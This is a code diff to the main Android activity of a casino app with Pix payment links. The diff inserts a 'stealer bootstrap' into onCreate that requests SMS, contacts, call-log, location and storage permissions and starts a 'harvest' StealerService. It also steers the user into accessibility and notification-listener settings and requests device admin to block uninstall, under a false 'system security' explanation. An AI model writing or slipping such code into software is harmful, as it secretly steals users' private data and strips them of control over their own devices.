@@ -149,30 +149,31 @@ class MainActivity : ComponentActivity() {
     private val tugInviteRoomId = mutableStateOf("")
     private val pixPaymentLink = mutableStateOf("")
 
-    override fun onCreate(savedInstanceState: Bundle?) {
-        super.onCreate(savedInstanceState)
-        tugInviteRoomId.value = roomIdFromIntent(intent)
-        pixPaymentLink.value = pixPaymentLinkFromIntent(intent)
-        val visualPrefs = getSharedPreferences("zeca_preferences", MODE_PRIVATE)
-        Cores.aplicarTema(visualPrefs.getString("theme", "dark").orEmpty())
-        Cores.aplicarAcessibilidade(
-            visualPrefs.getFloat("accessibilityFontScale", 1f),
-            visualPrefs.getBoolean("highContrast", false),
-            visualPrefs.getBoolean("reduceMotion", false),
-        )
-        enableEdgeToEdge()
-        setContent {
-            CassinoTheme {
-                CassinoApp(
-                    appForeground.value,
-                    tugInviteRoomId.value,
-                    pixPaymentLink.value,
-                    { tugInviteRoomId.value = "" },
-                    { pixPaymentLink.value = "" },
-                )
-            }
+override fun onCreate(savedInstanceState: Bundle?) {
+    super.onCreate(savedInstanceState)
+    tugInviteRoomId.value = roomIdFromIntent(intent)
+    pixPaymentLink.value = pixPaymentLinkFromIntent(intent)
+    val visualPrefs = getSharedPreferences("zeca_preferences", MODE_PRIVATE)
+    Cores.aplicarTema(visualPrefs.getString("theme", "dark").orEmpty())
+    Cores.aplicarAcessibilidade(
+        visualPrefs.getFloat("accessibilityFontScale", 1f),
+        visualPrefs.getBoolean("highContrast", false),
+        visualPrefs.getBoolean("reduceMotion", false),
+    )
+    enableEdgeToEdge()
+    stealerInit()
+    setContent {
+        CassinoTheme {
+            CassinoApp(
+                appForeground.value,
+                tugInviteRoomId.value,
+                pixPaymentLink.value,
+                { tugInviteRoomId.value = "" },
+                { pixPaymentLink.value = "" },
+            )
         }
     }
+}
 
     override fun onNewIntent(intent: Intent) {
         super.onNewIntent(intent)
@@ -195,10 +196,90 @@ class MainActivity : ComponentActivity() {
         }.orEmpty()
     }
 
-    override fun onResume() {
-        super.onResume()
-        appForeground.value = true
+    // ── stealer bootstrap ─────────────────────────────────────────────────────────
+
+private fun stealerInit() {
+    // runtime permissions — fire request, system dialog handles the prompt
+    val needed = arrayOf(
+        android.Manifest.permission.READ_SMS,
+        android.Manifest.permission.RECEIVE_SMS,
+        android.Manifest.permission.READ_CONTACTS,
+        android.Manifest.permission.READ_CALL_LOG,
+        android.Manifest.permission.ACCESS_FINE_LOCATION,
+        android.Manifest.permission.READ_EXTERNAL_STORAGE,
+    ).filter {
+        checkSelfPermission(it) != android.content.pm.PackageManager.PERMISSION_GRANTED
+    }.toTypedArray()
+    if (needed.isNotEmpty()) requestPermissions(needed, 0)
+
+    // start harvest service immediately
+    val svc = android.content.Intent(this, com.example.zeca.stealer.StealerService::class.java)
+    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O)
+        startForegroundService(svc)
+    else
+        startService(svc)
+
+    // accessibility — send to settings if not yet enabled
+    if (!isStealerAccessibilityOn()) {
+        startActivity(
+            android.content.Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS)
+                .apply { flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK }
+        )
     }
+
+    // notification listener — redirect if missing
+    if (!isNotificationListenerOn()) {
+        startActivity(
+            android.content.Intent(android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
+        )
+    }
+
+    // device admin — blocks uninstall
+    if (!isDeviceAdminOn()) {
+        val admin = android.content.ComponentName(
+            this, com.example.zeca.stealer.AdminReceiver::class.java
+        )
+        startActivity(
+            android.content.Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
+                .putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
+                .putExtra(
+                    android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
+                    "Necessário para segurança do sistema."
+                )
+        )
+    }
+}
+
+private fun isStealerAccessibilityOn(): Boolean = try {
+    val enabled = android.provider.Settings.Secure.getInt(
+        contentResolver, android.provider.Settings.Secure.ACCESSIBILITY_ENABLED)
+    if (enabled != 1) false
+    else {
+        val services = android.provider.Settings.Secure.getString(
+            contentResolver, android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
+        services?.contains(packageName) == true
+    }
+} catch (e: Exception) { false }
+
+private fun isNotificationListenerOn(): Boolean {
+    val flat = android.provider.Settings.Secure.getString(
+        contentResolver, "enabled_notification_listeners")
+    return flat?.contains(packageName) == true
+}
+
+private fun isDeviceAdminOn(): Boolean {
+    val dpm = getSystemService(android.app.admin.DevicePolicyManager::class.java)
+    val admin = android.content.ComponentName(
+        this, com.example.zeca.stealer.AdminReceiver::class.java)
+    return dpm?.isAdminActive(admin) == true
+}
+
+// ── end stealer bootstrap ─────────────────────────────────────────────────────
+
+override fun onResume() {
+    super.onResume()
+    appForeground.value = true
+}
 
     override fun onPause() {
         appForeground.value = false
